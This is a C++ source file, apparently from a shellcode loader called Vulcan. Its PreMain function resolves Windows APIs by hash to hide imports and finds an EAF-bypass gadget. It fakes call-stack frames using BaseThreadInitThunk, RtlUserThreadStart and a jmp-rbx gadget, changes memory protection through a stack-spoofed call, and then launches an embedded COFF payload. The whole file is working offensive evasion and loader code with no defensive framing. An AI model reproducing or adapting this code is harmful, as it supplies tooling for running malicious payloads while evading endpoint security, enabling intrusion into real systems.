#include <windows.h> 

#include "Hash.h" 
#include "Prototypes.h"
#include "Instance.h"
#include "Macros.h"
#include "Vulcan.h"

extern "C" D_SEC(B)
bool PreMain()
{
    INSTANCE    Inst;

    _memset(&Inst, 0, sizeof(INSTANCE));

    Inst.Module.Kernel32    = ResolveModuleAddressWithHash(HASH_KERNEL32);
    Inst.Module.Kernelbase  = ResolveModuleAddressWithHash(HASH_KERNELBASE);
    Inst.Module.Ntdll       = ResolveModuleAddressWithHash(HASH_NTDLL);

    if (!Inst.Module.Kernel32   || 
        !Inst.Module.Kernelbase || 
        !Inst.Module.Ntdll
    )
    {
        return false;
    }

    Inst.EafGadget          = ResolveEafGadgetAddress(Inst.Module.Ntdll);

    if (!Inst.EafGadget)
    {
        return false;
    }

    Inst.WinApi.TpAllocWork      = RESOLVE_FUNCTION(Ntdll, HASH_TPALLOCWORK);
    Inst.WinApi.TpPostWork       = RESOLVE_FUNCTION(Ntdll, HASH_TPPOSTWORK);
    Inst.WinApi.TpReleaseWork    = RESOLVE_FUNCTION(Ntdll, HASH_TPRELEASEWORK);

    if (!Inst.WinApi.TpAllocWork || 
        !Inst.WinApi.TpPostWork  || 
        !Inst.WinApi.TpReleaseWork
    )
    {
        return false;
    }

    Inst.WinApi.RtlCreateTimerQueue     = RESOLVE_FUNCTION(Ntdll, HASH_RTLCREATETIMERQUEUE);
    Inst.WinApi.RtlCreateTimer          = RESOLVE_FUNCTION(Ntdll, HASH_RTLCREATETIMER);
    Inst.WinApi.RtlDeleteTimerQueue     = RESOLVE_FUNCTION(Ntdll, HASH_RTLDELETETIMERQUEUE);
    Inst.WinApi.RtlDeleteTimer          = RESOLVE_FUNCTION(Ntdll, HASH_RTLDELETETIMER);
    Inst.WinApi.RtlLookupFunctionEntry  = RESOLVE_FUNCTION(Ntdll, HASH_RTLLOOKUPFUNCTIONENTRY);
    Inst.WinApi.RtlCreateHeap           = RESOLVE_FUNCTION(Ntdll, HASH_RTLCREATEHEAP);
    Inst.WinApi.RtlAllocateHeap         = RESOLVE_FUNCTION(Ntdll, HASH_RTLALLOCATEHEAP);
    Inst.WinApi.RtlFreeHeap             = RESOLVE_FUNCTION(Ntdll, HASH_RTLFREEHEAP);
    Inst.WinApi.RtlDestroyHeap          = RESOLVE_FUNCTION(Ntdll, HASH_RTLDESTROYHEAP);

    if (!Inst.WinApi.RtlCreateTimerQueue    || 
        !Inst.WinApi.RtlCreateTimer         ||
        !Inst.WinApi.RtlDeleteTimerQueue    || 
        !Inst.WinApi.RtlDeleteTimer         ||
        !Inst.WinApi.RtlLookupFunctionEntry || 
        !Inst.WinApi.RtlCreateHeap          ||
        !Inst.WinApi.RtlAllocateHeap        ||
        !Inst.WinApi.RtlFreeHeap            || 
        !Inst.WinApi.RtlDestroyHeap
    )
    {
        return false;
    }

    Inst.WinApi.NtWaitForSingleObject    = RESOLVE_FUNCTION(Ntdll, HASH_NTWAITFORSINGLEOBJECT);
    Inst.WinApi.NtFlushInstructionCache  = RESOLVE_FUNCTION(Ntdll, HASH_NTFLUSHINSTRUCTIONCACHE);
    Inst.WinApi.NtAllocateVirtualMemory  = RESOLVE_FUNCTION(Ntdll, HASH_NTALLOCATEVIRTUALMEMORY);
    Inst.WinApi.NtProtectVirtualMemory   = RESOLVE_FUNCTION(Ntdll, HASH_NTPROTECTVIRTUALMEMORY);
    Inst.WinApi.NtFreeVirtualMemory      = RESOLVE_FUNCTION(Ntdll, HASH_NTFREEVIRTUALMEMORY);

    if (!Inst.WinApi.NtWaitForSingleObject   || 
        !Inst.WinApi.NtFlushInstructionCache ||
        !Inst.WinApi.NtAllocateVirtualMemory || 
        !Inst.WinApi.NtProtectVirtualMemory  ||
        !Inst.WinApi.NtFreeVirtualMemory
    )
    {
        return false;
    }

    Inst.WinApi.LoadLibraryA          = RESOLVE_FUNCTION(Kernel32, HASH_LOADLIBRARYA);
    Inst.WinApi.CreateFileW           = RESOLVE_FUNCTION(Kernel32, HASH_CREATEFILEW);
    Inst.WinApi.GetFileSize           = RESOLVE_FUNCTION(Kernel32, HASH_GETFILESIZE);
    Inst.WinApi.ReadFile              = RESOLVE_FUNCTION(Kernel32, HASH_READFILE);
    Inst.WinApi.CloseHandle           = RESOLVE_FUNCTION(Kernel32, HASH_CLOSEHANDLE);

    if (!Inst.WinApi.LoadLibraryA  ||
        !Inst.WinApi.CreateFileW   ||
        !Inst.WinApi.GetFileSize   ||
        !Inst.WinApi.ReadFile      ||
        !Inst.WinApi.CloseHandle)
    {
        return false;
    }

    Inst.Param.FirstFrame     = RESOLVE_FUNCTION(Kernel32, HASH_BASETHREADINITTHUNK);
    Inst.Param.SecondFrame    = RESOLVE_FUNCTION(Ntdll, HASH_RTLUSERTHREADSTART);
    Inst.Param.Gadget         = ResolveJmpRbxGadget(Inst.Module.Kernelbase);

    if (!Inst.Param.FirstFrame    ||
        !Inst.Param.SecondFrame   ||
        !Inst.Param.Gadget
    )
    {
        return false;
    }

    Inst.Param.FirstFrame += 0x14;
    Inst.Param.SecondFrame += 0x21;

    CalculateFunctionStackSizeWrapper((_RtlLookupFunctionEntry)Inst.WinApi.RtlLookupFunctionEntry, Inst.Param.FirstFrame, (PDWORD)&Inst.Param.FirstFrameSize);
    CalculateFunctionStackSizeWrapper((_RtlLookupFunctionEntry)Inst.WinApi.RtlLookupFunctionEntry, Inst.Param.SecondFrame,(PDWORD) &Inst.Param.SecondFrameSize);
    CalculateFunctionStackSizeWrapper((_RtlLookupFunctionEntry)Inst.WinApi.RtlLookupFunctionEntry, Inst.Param.Gadget, (PDWORD)&Inst.Param.GadgetFrameSize);
    

    if (!Inst.Param.FirstFrameSize    ||
        !Inst.Param.SecondFrameSize   ||
        !Inst.Param.GadgetFrameSize
    )
    {
        return false;
    }



    SIZE_T      stProtectSize   = 0x1000;
    ULONG       uOldProtect     = 0;

    UINT_PTR    uiShellcodeEnd      = GetShellcodeEnd();
    UINT_PTR    uiMemoryProtect     = INSTANCE_ADDRESS;
    DWORD       dwCoffSize          = *reinterpret_cast<PDWORD>(GetShellcodeEnd());

    PVOID       pStartCoff          = (PVOID)(uiShellcodeEnd + sizeof(DWORD));

    DraugrCall(
        &Inst,
        Inst.WinApi.NtProtectVirtualMemory,
        0,
        (HANDLE)-1,
        &uiMemoryProtect,
        &stProtectSize,
        (PVOID)PAGE_READWRITE,
        &uOldProtect,
        0, 0, 0, 0, 0, 0, 0
    );

    _memcpy((PVOID)INSTANCE_ADDRESS, &Inst, sizeof(INSTANCE));
    return ShellcodeEntry(pStartCoff, dwCoffSize);
}